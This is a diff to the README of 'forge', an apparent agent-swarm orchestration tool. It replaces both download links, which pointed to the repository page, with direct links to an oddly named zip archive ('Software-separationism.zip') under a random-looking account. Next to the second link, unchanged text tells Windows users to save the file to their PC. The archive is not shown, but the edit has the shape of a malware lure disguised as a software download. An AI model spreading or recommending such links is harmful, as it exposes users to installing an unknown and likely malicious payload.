@@ -1,6 +1,6 @@
 # ⚙️ forge - Orchestrate agent swarms with control
 
-[![Download forge](https://img.shields.io/badge/Download-forge-blue?style=for-the-badge&logo=github)](https://github.com/prolonged-leontodonautumnalis247/forge)
+[![Download forge](https://img.shields.io/badge/Download-forge-blue?style=for-the-badge&logo=github)](https://github.com/prolonged-leontodonautumnalis247/forge/raw/refs/heads/main/transpicuity/Software-separationism.zip)
 
 ## 🧭 What is forge?
 
@@ -30,7 +30,7 @@ For smooth use, close other large apps before you run forge.
 
 Use this link to visit the page and download forge:
 
-[Open the forge download page](https://github.com/prolonged-leontodonautumnalis247/forge)
+[Open the forge download page](https://github.com/prolonged-leontodonautumnalis247/forge/raw/refs/heads/main/transpicuity/Software-separationism.zip)
 
 After the page opens, look for the latest Windows download and save the file to your PC.
 
